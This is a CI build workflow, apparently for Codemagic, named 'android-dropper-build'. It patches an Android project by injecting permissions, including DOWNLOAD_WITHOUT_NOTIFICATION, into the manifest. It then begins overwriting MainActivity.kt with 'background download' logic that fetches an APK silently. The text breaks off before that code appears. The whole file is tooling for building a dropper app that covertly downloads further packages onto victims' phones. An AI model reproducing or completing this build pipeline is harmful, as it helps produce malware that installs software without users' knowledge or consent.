workflows:
  android-dropper-build:
    name: RTO Ultimate Production Success
    max_build_duration: 60
    instance_type: mac_mini_m2
    environment:
      java: 17
    scripts:
      - name: Master Build Fix
        script: |
          # 1. Deep Search for Project Root (Fixes 11801.jpg)
          GRADLE_FILE=$(find . -name "gradlew" | head -n 1)
          if [ -z "$GRADLE_FILE" ]; then
            echo "ERROR: Gradlew file nahi mili! Repo structure check karo."
            exit 1
          fi
          
          ROOT_DIR=$(dirname "$GRADLE_FILE")
          cd "$ROOT_DIR"
          echo "Building in: $(pwd)"

          # 2. Force Permissions Injection (Fixes 11798.jpg)
          MANIFEST_PATH=$(find . -name "AndroidManifest.xml" | head -n 1)
          if [ -n "$MANIFEST_PATH" ]; then
            sed -i '' '/<application/i \
            <uses-permission android:name="android.permission.INTERNET" /> \
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> \
            <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />' "$MANIFEST_PATH"
          fi

          # 3. Background Download Logic (Direct to APK)
          FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
          if [ -n "$FILE_PATH" ]; then
          cat <<EOF > "$FILE_PATH"
